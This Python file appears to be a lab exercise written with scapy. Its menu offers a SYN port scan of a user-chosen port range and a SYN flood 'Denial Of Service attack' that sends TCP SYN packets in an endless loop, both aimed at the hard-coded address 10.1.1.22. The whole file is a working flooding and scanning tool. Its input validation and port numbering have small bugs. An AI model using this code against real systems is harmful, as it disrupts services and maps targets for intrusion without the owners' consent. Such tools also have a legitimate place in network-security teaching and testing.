from scapy.all import *

def dos():
    valid = 0
    while (valid == 0):
        try:
            port = int(input("Enter port number to perform Denial Of Service attack on: "))
            if (not (port >= 1 and port <= 65535)):
                raise Exception
            valid = 1
        except KeyboardInterrupt:
            print("Keyboard Interrupt")
            exit()
        except Exception:
            print("Please enter valid inputs!")

    print("Press Ctrl+C to stop")
    try: 
        while (True):
            send(IP(dst="10.1.1.22")/TCP(dport=(port), flags="S"))

    except KeyboardInterrupt:
        print("Request to stop")


def min_max_ports():
    valid = 0
    while (valid == 0):
        try:
            min_port = int(input("Enter min port number: "))
            if (not (min_port >= 1 and min_port <= 65535)):
                raise Exception
            max_port = int(input("Enter max port number: "))
            if (not (max_port >= 1 and max_port <= 65535) and (max_port >= min_port)):
                raise Exception
            valid = 1
        except KeyboardInterrupt:
            print("Keyboard Interrupt")
            exit()
        except Exception:
            print("Please enter valid inputs!")

    return (min_port, max_port)


def synscan(minimum, maximum, open_ports):
    done = 0
    answers = []
    while (not done):
        if (maximum - minimum > 128):
            ans, unans = sr(IP(dst="10.1.1.22")/TCP(dport=(minimum, minimum+127), flags="S"))
            answers.append(ans)
            minimum = minimum+128
        else:
            ans, unans = sr(IP(dst="10.1.1.22")/TCP(dport=(minimum, maximum), flags="S"))
            answers.append(ans)
            done = 1

    print(answers)

    open_ports.clear()
    for j in range(0, len(answers)):
        for i in range(0, len(answers[j])):
            if (str(tuple(answers[j][i].answer[1])).find("flags=SA") != -1):
                print("Port " + str(min_port+j*128+i) + " is open")
                open_ports.append(min_port+j*128+i)
            else:
                print("Port " + str(min_port+j*128+i) + " is closed")

    print("Currently, ports", open_ports, "are open")

open_ports = []

while (True):
    try: 
        choice = int(input("Enter choice:\n1. SYN Scan\n2. Denial of Service\nExit: -1\n\nChoice: "))
        if (choice == 1):
            min_port, max_port = min_max_ports()
            synscan(min_port, max_port, open_ports)
        elif (choice == 2):
            dos()
        elif (choice == -1):
            print("Goodbye")
            exit()
        else:
            print("Invalid Choice.")


    except KeyboardInterrupt:
        print("Keyboard Interrupt")
        exit()
    except Exception as exc:
        print(exc)
